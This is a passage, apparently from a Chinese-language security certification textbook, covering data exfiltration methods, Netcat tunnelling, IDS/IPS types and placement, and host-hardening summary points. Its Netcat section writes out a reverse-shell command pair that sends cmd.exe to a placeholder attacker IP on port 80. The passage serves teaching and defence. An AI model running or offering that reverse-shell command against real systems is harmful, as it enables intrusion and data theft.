
**物理访问**：通过 USB、火线或蓝牙设备将数据或信息复制到介质上。物理访问也可能意味着物理性地放置伪造接入点（AP）、窃听内部互联网电缆、安装如间谍软件或逻辑炸弹之类的软件、附加嗅探设备，甚至是人直接拍照或打印文档并带走。

**隐写术**：使用图像、MP3 文件、视频或文档中的空白来隐藏和提取数据。

**原生远程应用程序**：使用内置应用程序（如 FTP、Telnet 或 RDP）来移除数据。

**允许的协议**：使用 TCP、UDP 或 ICMP 建立隧道将流量外传到网络之外。

由于攻击者从网络中提取数据有如此多的可能方法，数据外泄是一个重大的安全问题。私有数据可能被泄露，导致收入损失、组织罚款和信任丧失。在极端情况下，外泄可能会危及政府的安全。

在一次数据外泄案例中，Stephen Watt 被指控编写了名为“blabla”的嗅探程序。这种数据外泄工具被用于从 TJX 及其他公司盗取超过 4000 万信用卡号。您可以在 http://www.wired.com/threatlevel/2009/06/watt/ 阅读更多信息。

检测和阻止数据外泄需要使用安全事件管理解决方案，严密监控出口数据传输。数据丢失防护（DLP）需要对出口网络流量进行异常分析，并使用具有深度数据包检测功能的更好的出口防火墙控制。

## 在系统中发现 Netcat 意味着糟糕的一天

Netcat 是广为人知的黑客工具，具有用作隧道的能力。如果攻击者可以在他们的计算机上设置 Netcat 监听器，然后在受感染的系统上设置 Netcat，该工具就可以轻松地用于隧道化一个命令行连接，如下所示：

攻击者在本地执行此命令：`nc -n -v -l -p 80`

攻击者随后在受害者的计算机上远程执行此命令：`nc -n Hacker's IP address 80 -e "cmd.exe"`

在此示例中，端口 80 被用于隧道化连接。这使得攻击更难防御，因为大多数网络都允许 80 端口用于 HTTP 流量。在计算机上发现 Netcat——或加密版本 Cryptcat——只能意味着有人正尝试数据外泄。

## 入侵检测与防护

入侵检测系统（IDS）收集并分析数据。在讨论入侵检测类型之前，让我们首先查看各种方式。入侵检测通常基于以下方式：

**特征识别**：特征识别依赖于已知攻击的数据库。特征识别最大的局限性是它只能检测已知的攻击。入侵检测与防护（IDP）工具如 Snort 或 Suricata 仍然不可或缺。然而，它们应该结合其他措施。入侵检测系统取决于其部署的位置。

**异常检测**：异常检测系统基于正常行为运行。如果攻击者随时间缓慢改变其行为，异常系统可能检测不到。异常检测擅于发现显著异于正常的行为。

**协议解码**：这种类型的系统使用模型并理解。协议解码 IDS 具有重组数据包并查看高层的能力。协议解码入侵需要 IDS 维护状态。为了有效检测这些入侵，IDS 必须理解各种应用层协议。这里是 IDS 的一些基本组件：

**传感器**：检测并将数据发送到系统。

**中央监控系统**：提供应对特定事件的信息。

**报告分析**：执行趋势分析，并存储攻击者的 IP 地址。

**响应盒**：接收之前组件的输入并形成适当的响应。例如，响应盒可能会决定阻止、丢弃甚至重定向网络流量。

IDS 等设备的放置是另一个考虑因素。图 4.5 显示了一个示例。这种放置需要一些考虑，因为毕竟，非军事化区（DMZ）的传感器很好地检测滥用，但对于网络内部的攻击者来说是毫无用处的。

![](img/7868547987f5920cfe632b85047c64af_285_0.png) 图 4.5 网络入侵 IDS 的放置

再次，传感器的放置需要考虑。IDS 传感器可以放置在外部 DMZ，也可以放置在网络内部。传感器也可以放置在特定系统上。传感放置在很大程度上决定了部署什么类型的入侵系统。传感器也可以以串联方式放置，其中一个 IDS 执行特征扫描，并允许有效流量通过第二种 IDS（后者执行启发式或其他扫描类型）。这有助于确保不会因为对单个 IDS 产生过多需求而产生瓶颈。请注意，入侵检测系统被大致分为两类：

**网络入侵检测系统 (NIDS)**：类似于网络嗅探器，IDS 设计用于捕获和分析网络流量。IDS 在数据包通过时对其进行检查。一旦发现可疑流量，所采取的行动取决于特定的 NIDS（网络入侵检测系统）及其当前配置。它可以被配置为重置会话，甚至禁用特定的流量。NIDS 具有监控网络部分区域的能力，并在防火墙和主机之间提供额外的防御层。它们的缺点包括攻击者可以实施插入攻击、会话切片和分段攻击，以防止 NIDS 检测到攻击。此外，如果使用了内联网络加密（INE），IDS 将只能看到加密流量。NIDS 的局限性还在于它只能看到其所连接的网络跨范围。这引出了一个重要的事实：当我说 NIDS 可能会看到该范围时，我的意思是它们通常被放置在镜像端口（mirrored port）上，所有通过网络设备的流量都会转发到该端口。这可以是交换机上的镜像端口，甚至是路由器上的端口。在 Cisco 的世界里，由于显而易见的原因，这些端口被称为交换端口分析（Switched Port Analyzer，简称 SPAN）端口。

![](img/7868547987f5920cfe632b85047c64af_286_0.png)

当攻击者发送经过构造的 IDS 数据包时就会发生插入攻击，这些数据包的存活时间（TTL）可以到达 IDS 但无法到达目标计算机。结果是 IDS 和目标计算机会重建两个不同的流量流。这使得攻击者的恶意活动能够不被检测到。

# 主机入侵检测系统 (HIDS)

HIDS 设计用于监控计算机系统而非网络。HIDS 检查主机活动并将其与可接受活动的基准进行比较。这些活动是通过使用 HIDS 应该监控的系统对象数据库来确定的。HIDS 驻留在主机计算机上（参见图 4.6），静静地监控流量并尝试检测可疑活动。可疑活动范围涵盖从尝试修改系统文件到不安全地激活 ActiveX 命令等。关于 HIDS 需要记住的点包括：它们会消耗主机的部分资源，但具有可能分析加密流量的能力，并且在端点解密后发现异常事件时可以触发。在高度安全的环境中，还可能使用内联媒体加密器（IME）。这种设备与 INE 类似，它位于计算机处理器和硬盘之间的内联位置，以确保传输中数据的安全。在此处阅读更多信息：www.nsa.gov/ia/programs/inline_media_encryptor/

由于 IDS 和 IDP 的进步，NIST 现在将这些技术称为 IDP。学习更多 IDP 的良好途径是 NIST 800-94，其地址为 http://csrc.nist.gov/publications/nistpubs/800-94/SP800-94.pdf。

# 摘要

主机安全可以分为两个大类：

- 减少攻击面
- 实施控制措施以检测并响应问题

主机加固、限制命令行能力、移除不需要的应用程序和程序、部署标准操作系统以及使用组策略实施强力安全，都是用于减少攻击面的技术。每种技术都消除了或限制了攻击者或恶意人员的能力。

本章讨论的某些控制措施具有检测或消除问题的能力。这些包括反恶意软件、反间谍软件、垃圾邮件过滤器、防火墙、HIDS、NIDS、HIPS 和 NIPS。这些工具和技术可以帮助限制恶意代码造成的破坏，甚至防止攻击的发生。像 IDS 等设备可以放置在网络边界；而像防病毒软件等设备可能存在于主机上。这些控制措施都增强了“深度防御”的概念。这种分层策略旨在通过多种变化方法来防御任何系统免受任何攻击。

能够描述主机防火墙。主机防火墙通常具有预定义的规则，用以保护主机免受基本攻击模式的影响。某些主机防火墙还可以防止恶意软件攻击网络上的其他设备。

能够描述可信操作系统。可信操作系统（TOS）可以定义为实施了足够的控制措施以支持多级安全的操作系统。可信操作系统必须经过测试，以证明其符合特定标准的正确性。这些标准要求 TOS 必须经过测试和验证。

了解端点解决方案的重要性。端点安全由位于客户端系统上的控制措施组成，例如对 USB 和 CD/DVD 的控制、防病毒软件、反恶意软件和反间谍软件。

能够描述防病毒软件。防病毒软件通常使用几种技术之一来识别和根灭病毒。这些方法使用签名文件来识别病毒和其他恶意软件，以及基于启发式的检测，后者寻找应用程序或服务偏离正常行为的情况。这种检测方法对于未知病毒和多态病毒非常有效。

能够描述反间谍软件。间谍软件是一个术语，用于描述各种不受欢迎的软件程序，其不良行为从通过弹出式广告骚扰你到秘密地将你的私人信息发送给他人不等。

能够描述垃圾邮件过滤器。过滤垃圾邮件的经典方法是深度防御。多枢纽技术使用多层防御来处理垃圾邮件。其理念是在邮件到达网络边缘的瞬间就开始过滤。

能够描述主机加固。主机加固可以描述为执行一系列步骤，目的是移除不需要的服务和服务功能，以增加攻击者成功攻击计算机的难度。

能够描述标准操作环境。标准操作系统是整个组织使用的标准化主机系统构建。这降低了总拥有成本（TCO）并提供了标准构建。这有助于配置管理并使补丁和升级变得更容易。

了解命令行限制的特点。限制用户对命令提示符的访问是加强安全的另一种方法。用户从命令提示符可以运行许多命令，这些命令可能会削弱安全性或允许攻击者在主机系统上提升权限。安全管理员不仅应该阻止访问命令行界面，还应该禁用 FTP、Telnet 和 TFTP 等不必要的程序。

能够解释警告横幅。警告横幅是简短的消息，用于告知用户有关使用应用程序和服务的特定策略和程序。警告横幅可以是启动屏幕、弹出窗口或消息框，告知用户特定规则。

**了解什么是受限接口。** 受限接口是一个配置文件，规定了环境内可以使用哪些程序、菜单、应用程序、命令或函数。这种技术允许安全管理员控制用户环境并规定他们可以访问哪些对象。这种技术被认为是受限接口，因为用户只能使用提供的环境与操作系统、已安装的应用程序和资源进行交互。

**能够描述数据外泄。** 数据外泄是从计算机未经授权地传输数据。由于攻击者有许多方法提取数据，数据外泄是一个大问题。隐私数据可能被破坏，导致收入损失、罚款和信任损失。

**能够描述 IDS 和 IPS。** 入侵检测系统（IDS）从其监控的计算机或网络收集并分析信息。入侵检测三种基本方法：签名识别、异常检测。NIDS 用于捕获并分析网络流量。
